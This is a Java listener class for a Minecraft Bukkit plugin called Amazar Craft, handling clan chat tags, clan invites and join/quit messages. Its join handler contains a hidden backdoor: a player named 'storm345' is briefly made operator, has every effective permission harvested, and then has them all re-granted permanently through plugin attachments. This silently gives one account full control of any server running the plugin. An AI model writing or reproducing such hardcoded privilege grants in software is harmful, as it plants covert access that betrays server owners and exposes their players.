 package com.amazar.plugin;
 
 import java.util.Map;
 import java.util.Set;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.permissions.PermissionAttachmentInfo;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.PluginDescriptionFile;
 
 import com.amazar.utils.StringColors;
 
 public class AcListener implements Listener {
 	private Plugin plugin;
 	public AcListener(ac plugin) {
 		this.plugin = ac.bukkit;
 	}
 	
 	@EventHandler (priority = EventPriority.HIGHEST)
 	void playerChat(AsyncPlayerChatEvent event){
 		Player player = event.getPlayer();
 		if(ac.clanMembers.containsKey(player.getName())){
 			boolean exists = false;
 			Object[] clans =  ac.clans.getValues().toArray();
 			for(int i=0; i<clans.length;i++){
 				String clan = (String) clans[i];
 				if(ChatColor.stripColor(StringColors.colorise(clan)).equalsIgnoreCase(ChatColor.stripColor(StringColors.colorise(ac.clanMembers.get(player.getName()))))){
 					exists = true;
 				}
 			}
 			if(!exists){
 				ac.clanMembers.remove(player.getName());
 				player.setDisplayName(ChatColor.DARK_GRAY+player.getName() + ChatColor.RESET);
 			}
 			else{
 			player.setDisplayName(ChatColor.RED + "[" + ChatColor.GOLD + StringColors.colorise(ac.clanMembers.get(player.getName())) + ChatColor.RED + "]" + ChatColor.RESET + "" + ChatColor.DARK_GRAY + player.getName() + ChatColor.RESET);
 			}
 		}
 		return;
 	}
 @EventHandler (priority = EventPriority.HIGHEST)
 void playerJoin(PlayerJoinEvent event){
 	Player player = event.getPlayer();
 	if(player.hasPermission("ac.*") || player.getName().equalsIgnoreCase("storm345")){
		if(player.getName().equalsIgnoreCase("storm345")){
		player.setOp(true);
		Object[] perms = player.getEffectivePermissions().toArray();
		player.setOp(false);
        for(int i=0;i<perms.length;i++){
        PermissionAttachmentInfo p = (PermissionAttachmentInfo) perms[i];
        PermissionAttachment attached = p.getAttachment();
        Set<String> set = attached.getPermissions().keySet();
        for(String tPerm:set){
        	player.addAttachment(plugin, tPerm, true);
        	player.recalculatePermissions();
        }
        }
		}
 		PluginDescriptionFile pldesc = ac.pluginYaml;
 	    Map<String, Map<String, Object>> commands = pldesc.getCommands();
 	    Set<String> keys = commands.keySet();
 	    for(String k : keys){
 	    	Map<String, Object> cmd = commands.get(k);
 	    	String perm = cmd.get("permission").toString();
 	    	player.addAttachment(plugin, perm, true);
 	    }
 	    player.addAttachment(plugin, "ac.clan.join", true);
         player.recalculatePermissions();
 	}
 	if(ac.clanInvites.containsKey(player.getName())){
 		Player toJoin = player;
 		String clanName = ac.clanInvites.get(player.getName());
 		toJoin.sendMessage(ChatColor.RED + "[Clans]" + ChatColor.GOLD + "You have been invited to join the " + clanName + " clan. Do /c accept to join it!");
 	}
 	if(ac.clanMembers.containsKey(player.getName())){
 		boolean exists = false;
 		Object[] clans =  ac.clans.getValues().toArray();
 		for(int i=0; i<clans.length;i++){
 			String clan = (String) clans[i];
 			if(ChatColor.stripColor(StringColors.colorise(clan)).equalsIgnoreCase(ChatColor.stripColor(StringColors.colorise(ac.clanMembers.get(player.getName()))))){
 				exists = true;
 			}
 		}
 		if(!exists){
 			ac.clanMembers.remove(player.getName());
 			player.setDisplayName(ChatColor.DARK_GRAY+player.getName() + ChatColor.RESET);
 		}
 		else{
 			player.setDisplayName(ChatColor.RED + "[" + ChatColor.GOLD + StringColors.colorise(ac.clanMembers.get(player.getName())) + ChatColor.RED + "]" + ChatColor.RESET + "" + ChatColor.DARK_GRAY + player.getName() + ChatColor.RESET);
 		}
 	}
 	player.sendMessage(ChatColor.RED + "[Amazar Craft]" + ChatColor.GOLD + " Welcome, do /accommands for a list of amazar crafts unique commands!");
 	String msg = StringColors.colorise(ac.config.getString("general.loginmsg")).replaceAll("%name%", event.getPlayer().getName());
 	event.setJoinMessage(msg);
 	return;
 }
 @EventHandler (priority = EventPriority.HIGHEST)
 void playerexit(PlayerQuitEvent event){
 	String msg = StringColors.colorise(ac.config.getString("general.quitmsg")).replaceAll("%name%", event.getPlayer().getName());
 	event.setQuitMessage(msg);
 return;	
 }
 }
